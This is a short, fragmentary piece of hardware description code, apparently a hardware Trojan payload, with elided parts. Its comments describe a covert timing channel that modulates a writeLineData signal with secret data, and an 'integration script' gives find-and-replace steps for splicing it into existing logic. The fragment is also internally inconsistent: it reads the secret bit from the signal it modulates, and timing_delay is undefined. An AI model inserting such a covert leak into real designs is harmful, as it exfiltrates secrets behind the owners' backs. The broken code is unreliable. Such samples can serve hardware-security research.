 ...
 * Payload: Modulate timing of writeLineData based on secret data
 * 
...
assign secret_bit = writeLineData[0];
...
// ============================================================
// Covert Channel: Modulate timing of writeLineData
//
// Integration Script Must Modify:
//
// IF writeLineData is timing-sensitive:
//   Find: assign writeLineData = ready_signal;
//   Replace: assign writeLineData = (timing_delay == 0) ? ready_signal : 1'b0;
//
